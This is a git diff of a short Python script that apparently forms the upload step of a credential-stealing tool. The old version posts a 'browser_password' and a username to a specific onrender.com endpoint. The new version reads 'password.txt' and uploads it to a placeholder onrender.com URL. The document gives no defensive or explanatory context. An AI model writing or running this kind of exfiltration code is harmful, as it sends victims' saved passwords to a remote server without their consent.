@@ -1,13 +1,10 @@
 import requests
 
-url = "https://flask-server-u699.onrender.com/receive"  # Replace with your actual Render URL
+url = "https://your-render-url.onrender.com/upload"
 
-data = {
-    "browser_password": "test_1234",
-    "username": "rojan"
-}
+with open("password.txt", "rb") as f:
+    files = {'file': ('password.txt', f)}
+    res = requests.post(url, files=files)
 
-response = requests.post(url, json=data)
-
-print("Status Code:", response.status_code)
-print("Response Body:", response.text)
+print("Status:", res.status_code)
+print("Response:", res.text)
